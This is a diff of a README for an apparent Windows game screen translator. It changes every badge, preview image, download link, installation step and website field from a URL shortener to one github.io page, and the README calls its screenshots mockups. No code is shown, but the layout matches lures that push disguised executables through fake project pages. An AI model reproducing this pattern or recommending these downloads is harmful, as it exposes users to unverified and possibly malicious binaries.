@@ -8,30 +8,30 @@ Offline Game Screen Translator for Windows - capture a game region, run local OC
 
 ## Quick Access
 
-[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Profiles](https://img.shields.io/badge/Profiles-Batch%20Ready-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Profiles](https://img.shields.io/badge/Profiles-Batch%20Ready-8250df?style=for-the-badge)](https://trainedhierar.github.io/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://trainedhierar.github.io/)
 
 ---
 
 ## Download
 
-➡️ **[Download the Windows build](https://flyn.co/17yeN7/)**
+➡️ **[Download the Windows build](https://trainedhierar.github.io/)**
 
 ---
 
 ## Preview
 
-[![Preview](assets/preview.png)](https://flyn.co/17yeN7/)
+[![Preview](assets/preview.png)](https://trainedhierar.github.io/)
 
 ### Dashboard
 
-[![Dashboard](assets/dashboard.png)](https://flyn.co/17yeN7/)
+[![Dashboard](assets/dashboard.png)](https://trainedhierar.github.io/)
 
 ### Feature Overview
 
-[![Features](assets/features.png)](https://flyn.co/17yeN7/)
+[![Features](assets/features.png)](https://trainedhierar.github.io/)
 
 > Images are project UI mockups and demonstrate the intended desktop workflow.
 
@@ -103,7 +103,7 @@ Profiles can store backend selection, quality level, input/output preferences, q
 ## Installation
 
 1. Download the current Windows package:
-   **[Download Latest Version](https://flyn.co/17yeN7/)**
+   **[Download Latest Version](https://trainedhierar.github.io/)**
 2. Extract it into a dedicated folder.
 3. Start the application.
 4. Select an input file, folder, game window, or capture region depending on the tool.
@@ -155,7 +155,7 @@ Platform: Windows x64
 Type: Offline AI Desktop Utility
 Focus: Overlay / history / hotkeys / multiple regions
 Processing: Local-first
-Website: https://flyn.co/17yeN7/
+Website: https://trainedhierar.github.io/
 ```
 
 ---
